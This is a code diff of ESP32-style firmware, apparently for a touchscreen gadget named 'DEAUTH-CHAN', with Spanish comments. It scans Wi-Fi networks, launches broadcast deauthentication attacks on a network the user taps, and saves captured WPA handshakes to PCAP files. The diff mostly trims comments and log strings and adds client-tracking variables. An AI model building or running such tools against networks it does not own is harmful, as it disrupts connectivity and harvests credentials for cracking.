@@ -23,22 +23,26 @@ unsigned long lastScanTime = 0;
 bool scanning = false;
 unsigned long scanStartTime = 0;
 
-// Variable para almacenar la red seleccionada para atacar
 int redSeleccionada = -1;
 bool atacando = false;
 unsigned long ataqueStartTime = 0;
+
+ClienteInfo clientes[MAX_CLIENTES];
+int numClientes = 0;
+bool escaneandoClientes = false;
+unsigned long clientScanStart = 0;
 
 void onHandshakeCaptured(const uint8_t* frame, uint32_t len) {
     uint32_t ts = millis();
     pcap.writePacket(frame, len, ts/1000, (ts%1000)*1000);
     mascota.incrementarHandshakes();
-    Serial.printf("¡Handshake capturado! Tamaño: %d bytes\n", len);
+    Serial.printf("Handshake capturado! %d bytes\n", len);
 }
 
 void setup() {
     Serial.begin(115200);
     delay(1000);
-    Serial.println("DEAUTH-CHAN v1.0 - ¡Hola mundo!");
+    Serial.println("DEAUTH-CHAN v1.0");
     
     pinMode(TFT_LED_PIN, OUTPUT);
     digitalWrite(TFT_LED_PIN, HIGH);
@@ -51,14 +55,14 @@ void setup() {
     mascota.init(&tft);
     
     if (pcap.begin("deauth")) {
-        Serial.println("PCAP iniciado correctamente");
+        Serial.println("PCAP iniciado");
     }
     
     gps.begin();
     hunter.begin();
     hunter.setHandshakeCallback(onHandshakeCaptured);
     
-    Serial.println("Setup completado. ¡A divertirnos!");
+    Serial.println("Setup completado");
 }
 
 void loop() {
@@ -67,35 +71,31 @@ void loop() {
     mascota.update();
     mascota.dibujar();
     
-    // --- TÁCTIL ---
     if (touch.touched()) {
         TS_Point p = touch.getPoint();
         int x = map(p.x, 0, 4095, 0, 240);
         int y = map(p.y, 0, 4095, 0, 320);
         
-        // Si estamos en IDLE y tocamos la zona de redes (parte inferior)
         if (mascota.getEstado() == ESTADO_IDLE && y > 200) {
             int indice = (y - 200) / 20;
             if (indice < numRedes) {
                 redSeleccionada = indice;
-                atacando = true;
-                ataqueStartTime = millis();
                 mascota.setEstado(ESTADO_ATTACK);
                 
-                // Ejecutar el ataque
+                // Atacar la red seleccionada (broadcast)
                 hunter.deauth(redes[redSeleccionada], nullptr, 30);
                 
-                Serial.printf("Atacando red: %s\n", redes[redSeleccionada].ssid);
                 delay(100);
                 mascota.setEstado(ESTADO_IDLE);
-                atacando = false;
             }
+        } else if (mascota.getEstado() == ESTADO_IDLE && y > 100 && y < 200) {
+            // Zona para listar clientes (si están disponibles)
+            // Esto es solo un placeholder
         } else {
             mascota.tocar(x, y);
         }
     }
     
-    // --- ESCANEO NO BLOQUEANTE ---
     if (!scanning && millis() - lastScanTime > SCAN_INTERVAL) {
         mascota.setEstado(ESTADO_SCANNING);
         hunter.startScan();
